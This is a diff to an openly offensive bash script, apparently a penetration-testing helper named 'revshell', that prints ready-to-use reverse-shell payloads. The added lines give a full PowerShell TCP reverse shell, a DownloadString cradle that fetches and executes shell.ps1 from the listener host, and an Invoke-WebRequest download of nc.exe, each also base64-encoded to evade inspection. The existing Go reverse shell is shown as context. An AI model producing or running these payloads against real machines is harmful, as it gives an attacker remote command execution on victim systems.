@@ -20,7 +20,8 @@ figlet "Generating Eeevil..."
 echo -e ""
 echo -e "Welcome to revshell"
 echo -e "Select the type of revshell you want from this list..."
-echo -e "1=netcat; 1b=nc-win; 2=nc-bsd; 3=bash; 4=perl; 5=python; 6=php; 7=ruby 8=go: "
+echo -e "1=netcat; 1b=nc-win; 2=nc-bsd; 3=bash; 4=perl; 5=python; 6=php; 7=ruby; 8=go; "
+echo -e "Or some helpful powershell commands: 9=powershell-revshell; 9a=eax downloadstring; 9b=iwr:"
 echo -e "${NC}"
 echo -e ""
 
@@ -88,9 +89,30 @@ case $langu in
 	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
 	 echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\","$lhost:$lport");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" |base64;;
 
+	9)
+	 echo "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
+	 echo "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" |base64;;
+
+
+	9a)
+	 echo "powershell -c iex(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')"
+	 echo -e "${YELLOW}Remember to copy shell.ps1 to the PWD in Kali, and amend the last line! Then set a python server running! ${NC}"
+	 echo -e "${YELLOW}python3 -m http.server 80${NC}"
+	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
+	 echo "powershell -c iex(New-Object Net.WebClient).DownloadString('http://$lhost/shell.ps1')" |base64;;
+
+
+	9b)
+	 echo "powershell Invoke-WebRequest -uri http://$lhost/nc.exe -outfile c:\boo\nc.exe"
+	 echo -e "${YELLOW}Dont forget to create 'boo' directory first, and serve file with a python server!${NC}"
+	 echo -e "${YELLOW}python3 -m http.server 80${NC}"
+	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
+	 echo "powershell Invoke-WebRequest -uri http://$lhost/nc.exe -outfile c:\boo\nc.exe" |base64;;
+
 
 	*)
-	 echo -e "${RED}Sorry, just numbers 1-7 please! ${NC}"
+	 echo -e "${RED}Sorry, just numbers 1-9b please! ${NC}"
 	 exit
 
 esac
